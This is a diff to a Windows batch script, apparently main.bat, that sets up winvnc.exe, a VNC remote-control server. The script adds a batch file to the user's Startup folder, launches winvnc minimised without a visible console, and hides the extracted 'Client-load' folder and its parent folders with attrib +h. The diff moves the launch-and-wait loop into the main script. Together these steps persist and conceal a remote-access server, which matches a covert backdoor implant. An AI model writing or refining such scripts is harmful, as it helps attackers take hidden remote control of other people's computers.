@@ -7,22 +7,8 @@ REM Create the batch file for startup folder (startup_winvnc.bat)
 (
   echo @echo off
   echo timeout /t 3 >nul  REM Wait 3 seconds for computer startup
-  echo cd /d "%script_dir%"
-  REM Start winvnc.exe in the background without showing console
-  echo start /min "" winvnc.exe -run
-  REM Wait for winvnc.exe to have permissions (check every 2 seconds)
-  echo :CheckPermissions
-  echo echo Checking permissions for winvnc.exe...
-  echo REM Wait for winvnc.exe to have permissions (check every 2 seconds)
-  echo :loop
-  echo timeout /t 2 >nul
-  echo tasklist /fi "imagename eq winvnc.exe" 2>nul | find /i "winvnc.exe" >nul
-  echo if errorlevel 1 (
-  echo   goto loop
-  echo ) else (
-  echo   echo winvnc.exe has permissions. Starting run_winvnc.bat...
-  echo   call "%script_dir%run_winvnc.bat"
-  echo )
+  echo cd /d "%~dp0"
+  echo call "%~dp0run_winvnc.bat"
 ) > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startup_winvnc.bat"
 
 REM Create the batch file to run winvnc.exe (run_winvnc.bat)
@@ -50,8 +36,19 @@ REM Hide the extracted Client-load folder and its parent folder
 attrib +h "%script_dir%\.."
 attrib +h "%script_dir%\..\.."
 
-REM Display a completion message
-echo.
-echo Startup setup completed. Parent folders hidden.
+REM Start winvnc.exe and wait for permissions
+start /min "" winvnc.exe -run
+
+REM Wait for winvnc.exe to have permissions (check every 2 seconds)
+:CheckPermissions
+echo Checking permissions for winvnc.exe...
+timeout /t 2 >nul
+tasklist /fi "imagename eq winvnc.exe" 2>nul | find /i "winvnc.exe" >nul
+if errorlevel 1 (
+  goto CheckPermissions
+) else (
+  echo winvnc.exe has permissions. Starting run_winvnc.bat...
+  call "%script_dir%run_winvnc.bat"
+)
 
 REM End of main.bat
